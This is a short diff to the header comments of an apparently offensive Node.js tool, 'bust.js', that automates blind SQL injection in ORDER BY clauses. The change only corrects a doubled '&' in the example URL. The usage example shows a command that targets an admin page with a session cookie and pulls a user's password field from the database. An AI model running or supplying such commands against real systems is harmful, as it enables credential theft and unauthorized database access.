@@ -1,6 +1,6 @@
 // automating sql injection in ORDERBY clauses by using ASCII()== as a boolean test
 // usage: node bust.js vulnerableStatement targetFieldSelectStatement estimatedLength knownSortableColumn javascriptOrderTest cookies
-// e.g.: node bust.js "http://vulnerable.com/admin.php?page=exploitable&&OrderBy=" "SELECT user_pass FROM users WHERE ID = 1" 40 "ID" "html.lastIndexOf(\"[data id='1']\") < html.lastIndexOf(\"[data id='2']\")" "admincookie=blahblah;"
+// e.g.: node bust.js "http://vulnerable.com/admin.php?page=exploitable&OrderBy=" "SELECT user_pass FROM users WHERE ID = 1" 40 "ID" "html.lastIndexOf(\"[data id='1']\") < html.lastIndexOf(\"[data id='2']\")" "admincookie=blahblah;"
 
 var request = require('request');
 
